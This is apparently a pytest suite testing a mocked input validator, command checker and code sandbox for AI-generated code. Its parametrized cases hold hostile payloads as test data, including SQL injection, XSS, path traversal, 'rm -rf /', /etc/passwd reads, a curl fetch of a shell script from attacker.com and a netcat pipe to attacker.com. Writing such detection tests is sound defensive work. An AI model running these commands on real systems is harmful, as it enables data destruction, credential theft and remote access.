"""
Comprehensive Security Testing Suite.

Tests security aspects including input validation, authentication, authorization,
and vulnerability prevention with focus on AI-generated code security.
"""

import pytest
import re
from datetime import datetime, timedelta
from typing import Dict, List, Any
from unittest.mock import Mock, AsyncMock

# Test fixtures
from tests.fixtures.comprehensive_test_fixtures import (
    TestDataFactory,
    MockSecurityValidator,
    MockCodeSandbox,
    TestAssertions
)


class SecurityTestHarness:
    """Harness for conducting security tests."""
    
    def __init__(self):
        self.vulnerabilities_found = []
        
    def log_vulnerability(self, vuln_type: str, severity: str, description: str):
        """Log discovered vulnerability."""
        self.vulnerabilities_found.append({
            'type': vuln_type,
            'severity': severity,
            'description': description,
            'timestamp': datetime.utcnow()
        })
    
    def assert_no_critical_vulnerabilities(self):
        """Assert no critical vulnerabilities were found."""
        critical_vulns = [v for v in self.vulnerabilities_found if v['severity'] == 'critical']
        assert len(critical_vulns) == 0, f"Critical vulnerabilities found: {critical_vulns}"


class TestInputValidationSecurity:
    """Test suite for input validation and sanitization security."""
    
    @pytest.fixture
    def security_validator(self):
        """Create security validator for testing."""
        return MockSecurityValidator(safe_by_default=True)
    
    @pytest.fixture
    def security_harness(self):
        """Provide security testing harness."""
        return SecurityTestHarness()
    
    @pytest.mark.parametrize("malicious_input,attack_type", [
        ("'; DROP TABLE users; --", "sql_injection"),
        ("<script>alert('XSS')</script>", "xss"),
        ("../../etc/passwd", "path_traversal"),
        ("$(curl attacker.com/shell.sh)", "command_injection"),
        ("javascript:alert('XSS')", "javascript_injection")
    ])
    def test_malicious_input_detection(self, security_validator, security_harness, malicious_input, attack_type):
        """Test detection of various malicious input types."""
        is_safe = security_validator.is_safe(malicious_input)
        
        if not is_safe:
            security_harness.log_vulnerability(
                attack_type, 'high', f'Malicious input detected: {malicious_input[:50]}'
            )
        
        # Should detect as unsafe
        assert is_safe == False, f"Failed to detect {attack_type}: {malicious_input}"
    
    @pytest.mark.parametrize("safe_input", [
        "normal_user_input",
        "user@example.com",
        "Valid project name",
        "def valid_function(): return True"
    ])
    def test_safe_input_acceptance(self, security_validator, safe_input):
        """Test that legitimate input is accepted."""
        is_safe = security_validator.is_safe(safe_input)
        assert is_safe == True, f"Safe input incorrectly flagged as unsafe: {safe_input}"
    
    def test_command_injection_prevention(self, security_validator, security_harness):
        """Test prevention of command injection attacks."""
        dangerous_commands = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1337"
        ]
        
        for cmd in dangerous_commands:
            is_safe = security_validator.is_safe_command(cmd)
            
            if not is_safe:
                security_harness.log_vulnerability(
                    'command_injection', 'critical', f'Dangerous command blocked: {cmd}'
                )
            
            assert is_safe == False, f"Failed to block dangerous command: {cmd}"


class TestCodeExecutionSecurity:
    """Test suite for secure code execution and sandboxing."""
    
    @pytest.fixture
    def code_sandbox(self):
        """Create secure code sandbox."""
        return MockCodeSandbox()
    
    @pytest.mark.parametrize("malicious_code,attack_type", [
        ("import os; os.system('rm -rf /')", "system_command"),
        ("import subprocess; subprocess.run(['cat', '/etc/passwd'])", "file_access"),
        ("eval('__import__(\"os\").system(\"whoami\")')", "code_injection"),
        ("while True: pass", "infinite_loop")
    ])
    def test_malicious_code_detection(self, code_sandbox, malicious_code, attack_type):
        """Test detection and prevention of malicious code."""
        is_safe = code_sandbox.is_safe_code(malicious_code)
        
        # Should detect as unsafe
        assert is_safe == False, f"Failed to detect malicious {attack_type}: {malicious_code[:50]}"
    
    def test_resource_limits_enforcement(self, code_sandbox):
        """Test enforcement of resource limits."""
        # Test memory limit
        memory_bomb_code = """
data = []
for i in range(1000000):
    data.append('x' * 1000)
        """
        
        result = code_sandbox.execute(memory_bomb_code)
        
        # Should handle resource exhaustion
        assert 'error' in result or result['memory_usage'] < 100 * 1024 * 1024  # 100MB limit
    
    def test_execution_timeout(self, code_sandbox):
        """Test execution timeout enforcement."""
        infinite_loop_code = "while True: x = 1 + 1"
        
        result = code_sandbox.execute(infinite_loop_code, timeout=5)
        
        # Should timeout appropriately
        assert result['execution_time'] <= 10  # Should not exceed reasonable limit


class TestVulnerabilityScanning:
    """Test suite for vulnerability scanning and detection."""
    
    @pytest.fixture
    def vulnerability_scanner(self):
        """Create mock vulnerability scanner."""
        scanner = Mock()
        scanner.scan_for_vulnerabilities = Mock()
        return scanner
    
    def test_code_vulnerability_scanning(self, vulnerability_scanner):
        """Test scanning for code vulnerabilities."""
        sample_code = """
import os

def execute_command(cmd):
    os.system(cmd)  # Vulnerable: command injection
        """
        
        # Mock vulnerability detection
        vulnerability_scanner.scan_for_vulnerabilities.return_value = [
            {
                'type': 'command_injection',
                'severity': 'high',
                'line': 4,
                'description': 'os.system() allows command injection'
            }
        ]
        
        vulnerabilities = vulnerability_scanner.scan_for_vulnerabilities(sample_code)
        
        # Should detect vulnerabilities
        assert len(vulnerabilities) >= 1
        assert any(v['type'] == 'command_injection' for v in vulnerabilities)


class TestSecurityIntegration:
    """Integration security tests."""
    
    @pytest.mark.asyncio
    async def test_comprehensive_security_validation(self):
        """Test comprehensive security validation."""
        harness = SecurityTestHarness()
        
        # Mock security components
        validator = MockSecurityValidator()
        sandbox = MockCodeSandbox()
        
        # Test scenarios
        test_scenarios = [
            {'input': 'normal_input', 'should_pass': True},
            {'input': '<script>alert(1)</script>', 'should_pass': False},
            {'code': 'def safe_function(): return True', 'should_execute': True},
            {'code': 'import os; os.system("rm -rf /")', 'should_execute': False}
        ]
        
        for scenario in test_scenarios:
            if 'input' in scenario:
                result = validator.is_safe(scenario['input'])
                assert result == scenario['should_pass']
                
            if 'code' in scenario:
                result = sandbox.is_safe_code(scenario['code'])
                assert result == scenario['should_execute']
        
        # Verify overall security posture
        harness.assert_no_critical_vulnerabilities()


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])